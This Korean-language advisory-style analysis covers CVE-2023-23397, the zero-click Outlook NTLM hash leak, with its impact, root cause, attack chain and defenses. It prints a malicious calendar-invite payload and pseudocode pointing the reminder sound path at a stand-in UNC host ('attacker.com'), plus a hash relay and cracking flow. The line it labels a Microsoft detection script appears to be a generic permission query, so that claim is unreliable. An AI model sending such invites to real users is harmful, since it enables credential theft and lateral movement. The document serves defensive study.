# CVE-2023-23397 - Microsoft Outlook NTLM Relay (Zero-Click)

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2023-23397 |
| CVSS | 9.8 (Critical) |
| 영향 소프트웨어 | Microsoft Outlook for Windows |
| 영향 버전 | Outlook 2013, 2016, 2019, Microsoft 365 Apps for Enterprise |
| 수정 버전 | 2023년 3월 보안 업데이트 (KB5023220 등) |
| 공격 유형 | NTLM Relay / Credential Theft (Zero-Click) |
| 발견일 | 2023-03-14 |

## 영향 범위 & 심각성

사용자 상호작용 없이(zero-click) 메일 수신만으로 NTLM 인증 해시가 탈취되는 초고위험 취약점이다.

- **러시아 APT28(Fancy Bear)**이 2022년 4월부터 실제 공격에 활용
- 유럽 정부, 군사, 에너지, 교통 분야 조직이 주요 타겟
- 사용자가 메일을 **열지 않아도** Outlook 클라이언트가 메일을 수신하는 것만으로 트리거
- 미리보기 패널에서도 트리거되지 않고, 메일 도착 시점에 자동 실행
- NTLM 해시를 탈취하면 패스더해시(Pass-the-Hash) 공격으로 인증 우회 가능
- Active Directory 환경의 횡적 이동에 직접 활용

## 취약점 기술 분석

### 근본 원인

Outlook이 캘린더 초대 메시지의 **`PidLidReminderFileParameter`** 속성(리마인더 사운드 파일 경로)을 처리할 때, UNC 경로를 검증 없이 로드하려 시도한다.

```
// 악성 캘린더 초대의 MAPI 속성
PidLidReminderOverride: true
PidLidReminderPlaySound: true
PidLidReminderFileParameter: \\attacker-server\share\sound.wav
```

### 공격 체인

1. 공격자가 `PidLidReminderFileParameter`에 외부 UNC 경로를 설정한 캘린더 초대 전송
2. Outlook 클라이언트가 메일 수신 시 리마인더 처리
3. UNC 경로(`\\attacker-server\share\...`)에 SMB 연결 시도
4. SMB 인증 과정에서 사용자의 **NTLMv2 해시**가 공격자 서버로 전송
5. 공격자가 해시를 캡처하여 오프라인 크래킹 또는 릴레이 공격에 사용

## 공격 시나리오

```python
# 악성 캘린더 초대 생성 (교육 목적 의사코드)
import exchangelib

# 악성 속성이 설정된 캘린더 초대 생성
appointment = CalendarItem(
    subject="Team Meeting",
    start=datetime.now() + timedelta(minutes=1),
    end=datetime.now() + timedelta(hours=1),
    reminder_minutes_before_start=0,
)
# 핵심: 리마인더 사운드 경로를 외부 UNC로 설정
appointment.reminder_file_parameter = "\\\\attacker.com\\share\\meeting.wav"
appointment.reminder_override = True
```

```
공격 흐름:
1단계: 공격자가 SMB 릴레이 서버(Responder/ntlmrelayx) 준비
2단계: 악성 PidLidReminderFileParameter가 설정된 캘린더 초대 메일 전송
3단계: 피해자의 Outlook이 메일 수신 → 리마인더 트리거
4단계: Outlook이 공격자 서버로 SMB 연결 → NTLMv2 해시 노출
5단계: 해시 크래킹으로 평문 패스워드 획득 또는 NTLM 릴레이로 다른 서비스 인증
6단계: Exchange, SharePoint, 파일 서버 등 내부 리소스 접근
```

## 방어 방법

1. **즉시 패치 적용**: 2023년 3월 Microsoft 보안 업데이트 설치
2. **SMB 아웃바운드 차단**: 방화벽에서 TCP 445 아웃바운드 트래픽 차단
   ```
   # Windows 방화벽 규칙
   netsh advfirewall firewall add rule name="Block SMB Out" dir=out action=block protocol=tcp remoteport=445
   ```
3. **NTLM 비활성화**: 가능한 환경에서 NTLM 인증을 Kerberos로 전환
4. **Protected Users 그룹**: 중요 계정을 Protected Users 보안 그룹에 추가
5. **Microsoft 제공 감사 스크립트**: 과거 악용 여부 확인
   ```powershell
   # Microsoft 제공 탐지 스크립트
   Get-MailboxFolderPermission | Where {$_.FolderPath -like "*Calendar*"}
   ```
6. **EPA(Extended Protection for Authentication)**: Exchange에서 EPA 활성화
7. **네트워크 모니터링**: 내부에서 외부로의 비정상 SMB 연결 탐지

## 교훈

- **Zero-Click의 위험성**: 사용자 상호작용 없이 트리거되는 취약점은 방어가 극히 어려움
- **NTLM은 레거시 위험**: NTLM 인증은 릴레이/리플레이 공격에 본질적으로 취약
- **아웃바운드 트래픽 제어**: 클라이언트가 외부로 SMB 연결을 맺을 이유가 없음 → 기본 차단
- **APT의 장기 악용**: 패치 전 1년 가까이 국가 지원 해커에 의해 악용됨
- **이메일은 최대 공격 표면**: 모든 조직이 사용하며, 외부에서 내부로 직접 도달 가능한 채널

## 참고 자료

- [Microsoft Security Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397)
- [NVD - CVE-2023-23397](https://nvd.nist.gov/vuln/detail/CVE-2023-23397)
- [Microsoft Blog - Guidance](https://www.microsoft.com/en-us/security/blog/2023/03/24/guidance-for-investigating-attacks-using-cve-2023-23397/)
- [MDSec - Technical Analysis](https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/)
- [CISA Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
